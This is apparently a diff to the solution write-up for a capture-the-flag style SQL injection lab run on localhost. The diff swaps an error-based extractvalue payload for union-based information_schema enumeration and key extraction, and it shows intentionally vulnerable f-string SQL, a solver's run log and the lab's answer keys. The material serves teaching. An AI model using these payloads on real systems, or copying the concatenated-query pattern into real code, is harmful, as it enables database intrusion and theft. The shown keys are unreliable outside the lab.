@@ -4,8 +4,9 @@
 
 ## The shape of the chain
 
-Four stages, four independent bugs, deliberately identical in root cause
-and sink shape to four floors you already solved in Phase 1. Two separate
+Four stages, four SQLi techniques drawn from Phase 1, each a distinct kind
+of question: union + schema enumeration (stage 1), union column-matching
+(stage 2), boolean-blind (stage 3), and time-blind (stage 4). Two separate
 mechanisms make this a genuine *chain* and not four bugs that happen to
 share a page:
 
@@ -58,30 +59,49 @@ the same payload from door 1 returns `command denied` — stage 1's user
 has no grant on `bookhaven_key_4`, and `bookhaven_stage_keys` no longer
 exists. Each door can reach only its own key.
 
-## Stage 1, error-based (identical bug to p1_2)
+## Stage 1, union-based with schema enumeration (bug family of p1_3)
 
 ```python
 q = f"SELECT title FROM bookhaven_catalog WHERE id='{lookup_id}'"
+# a broken query renders a fixed message; raw DBMS errors are NOT echoed
 ```
 
-Same raw-concatenation-plus-echoed-error sink as Netero's Recipe Vault.
-Payload:
+This stage is **deliberately not error-based.** Error-based extraction
+(`extractvalue`) works by naming a table inside a subquery, you have to
+already know the table, or guess it, and `extractvalue`'s 32-character
+truncation makes enumerating the schema through the error channel painful
+and unreliable. So this door leaks no DBMS errors at all: a failed query
+just renders "the catalogue desk could not look that entry up". The only
+usable channel is the single-column value the `SELECT` renders, which is
+union-injectable. The intended path is **discovery, not guessing**:
 
-```
-id = 1' AND extractvalue(1,concat(0x3a,(SELECT key_value FROM bookhaven_key_1)))-- -
-```
+1. Enumerate the tables this door's user can even see. Thanks to the
+   per-stage least-privilege design, stage 1's user has `information_schema`
+   visibility into only `bookhaven_catalog` and its own key table:
 
-MariaDB's `extractvalue()` throws an XPATH syntax error whose message
-embeds its own (truncated) second argument, the subquery's result,
-and `f1_stage1()` renders that raw exception text back to the page,
-exactly like p1_2:
+   ```
+   id = nonexistent' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
+   ```
 
-```
-(1105, "XPATH syntax error: ':restricted_wing_7'")
-```
+   renders `bookhaven_key_1,bookhaven_catalog`. The non-catalogue table is
+   named outright, nothing is guessed.
 
-Stage 1's key: `restricted_wing_7`. No token was required, this stage
-is the chain's entry point.
+2. Enumerate that table's column (`key_value`):
+
+   ```
+   id = nonexistent' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='bookhaven_key_1'-- -
+   ```
+
+3. UNION SELECT the value out:
+
+   ```
+   id = nonexistent' UNION SELECT key_value FROM bookhaven_key_1-- -
+   ```
+
+   renders `restricted_wing_7` in the catalogue's `title` field. Stage 1's
+   key: `restricted_wing_7`. No token was required, this stage is the
+   chain's entry point, and solving it also teaches you the key-table
+   naming scheme (`bookhaven_key_N`) the later doors reuse.
 
 ## Stage 2, union-based (identical bug to p1_3)
 
@@ -141,7 +161,7 @@ the actual, unedited output of a real run against this exact seed
 
 ```
 [f1] target: http://localhost:8000/f/bookhaven
-[f1] stage 1, error-based extraction of stage 1's key
+[f1] stage 1, union-based extraction of stage 1's key (schema enumeration)
   ok: stage 1 key = 'restricted_wing_7'
 [f1] stage 2, union-based extraction of stage 2's key
   ok: stage 2 key = 'archive_seal_42'
@@ -186,8 +206,9 @@ This final is the master notes' 9-step SQLi methodology (notes §5),
 compressed into four gates instead of one target: (1) map entry points
 , four distinct parameters across four routes; (2) fingerprint the
 DBMS, MariaDB, same as every earlier floor; (3) initial tests, a bare
-`'` against stage 1 confirms the sink; (4) error-based, stage 1;
-(5) blind (boolean + time), stages 3 and 4; (6) union, stage 2;
+`'` against stage 1 confirms the sink; (4) enumerate the schema with
+union + information_schema, stage 1 (no table name guessed); (5) blind
+(boolean + time), stages 3 and 4; (6) union extraction, stages 1 and 2;
 (7) advanced (OOB/2nd-order), not required on this floor, already
 covered by Phase 3; (8) automate, `sqlmap` can solve stages 1-3
 individually with `-p id`/`-p q`/`-p code` once each stage's `token` is
